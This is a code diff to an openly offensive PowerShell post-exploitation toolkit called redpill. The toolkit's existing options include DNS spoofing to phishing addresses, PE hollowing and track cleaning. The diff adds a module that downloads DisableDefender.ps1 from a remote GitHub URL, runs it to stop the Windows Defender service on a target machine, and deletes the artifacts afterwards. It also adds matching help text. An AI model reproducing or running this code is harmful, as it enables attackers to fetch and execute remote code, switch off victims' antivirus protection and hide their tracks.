@@ -87,9 +87,11 @@
    [int]$Limmit='5', [string]$AppLocker="false",
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Domain="www.facebook.com",
+   [string]$ServiceName="WinDefend",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
-   [string]$Sponsor="false"
+   [string]$Sponsor="false",
+   [string]$Action="False"
 )
 
 
@@ -169,6 +171,7 @@ $ListParameters = @"
   -PingSweep        Enum|Verbose         Enumerate active IP Addr (and ports) of Local Lan
   -NetTrace         Enum                 Agressive sytem enumeration with netsh {native}
   -DnsSpoof         Enum|Redirect|Clear  Redirect Domain Names to our Phishing IP address
+  -DisableAV        Query|Start|Stop     Disable Windows Defender Service (WinDefend)
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -1840,7 +1843,6 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
    If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
 }
 
-
 If($PEHollow -ne "false"){
 
    <#
@@ -1934,7 +1936,6 @@ If($PEHollow -ne "false"){
    If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
 }
 
-
 if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
 
    <#
@@ -1999,7 +2000,6 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
 }
-
 
 If($DnsSpoof -ne "false"){
 
@@ -2090,6 +2090,72 @@ If($DnsSpoof -ne "false"){
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
+}
+
+If($Action -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @M2Team|@r00t-3xp10it
+      Disable Windows Defender Service (WinDefend) 
+
+   .DESCRIPTION
+      This CmdLet Query, Stops, Start Anti-Virus Windows Defender
+      service without the need to restart or refresh target machine.
+
+   .NOTES
+      Mandatory requirements: $ Administrator privileges $
+      Remark: Windows warns users that WinDefend is stopped!
+
+   .Parameter Action
+      Accepts arguments: Query, Stop and Start
+
+   .Parameter ServiceName
+      Accepts the Windows Defender Service Name
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Query
+      Querys the Windows Defender Service State
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Start
+      Starts the Windows Defender Service (WinDefend)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Stop
+      Stops the Windows Defender Service (WinDefend)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Stop -ServiceName "WinDefend"
+      Manual Input of Windows Defender Service Name (query: cmd /c sc query)
+
+   .OUTPUTS
+      Disable Windows Defender Service
+      --------------------------------
+      ServiceName      : WinDefend
+      StartType        : Automatic
+      CurrentStatus    : Stopped
+      ManualQuery      : Get-Service -Name WinDefend
+   #>
+
+   ## Download DisableDefender.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\DisableDefender.ps1")){## Download DisableDefender.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,2431640625/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $Action -ServiceName "$ServiceName"
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\BCDstore.msc"){Remove-Item -Path "$Env:TMP\BCDstore.msc" -Force}
+   If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
 }
 
 
@@ -3258,6 +3324,55 @@ $HelpParameters = @"
       #	127.0.0.1       localhost
       #	::1             localhost
       192.168.1.72 www.facebook.com
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Action" -or $Help -ieq "ServiceName"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @M2Team|@r00t-3xp10it
+      Disable Windows Defender Service (WinDefend) 
+
+   .DESCRIPTION
+      This CmdLet Query, Stops, Start Anti-Virus Windows Defender
+      service without the need to restart or refresh target machine.
+
+   .NOTES
+      Mandatory requirements: $ Administrator privileges $
+      Remark: Windows warns users that WinDefend is stopped!
+
+   .Parameter Action
+      Accepts arguments: Query, Stop and Start
+
+   .Parameter ServiceName
+      Accepts the Windows Defender Service Name
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Query
+      Querys the Windows Defender Service State
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Start
+      Starts the Windows Defender Service (WinDefend)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Stop
+      Stops the Windows Defender Service (WinDefend)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Stop -ServiceName "WinDefend"
+      Manual Input of Windows Defender Service Name (query: cmd /c sc query)
+
+   .OUTPUTS
+      Disable Windows Defender Service
+      --------------------------------
+      ServiceName      : WinDefend
+      StartType        : Automatic
+      CurrentStatus    : Stopped
+      ManualQuery      : Get-Service -Name WinDefend
    #>!bye..
 
 "@;
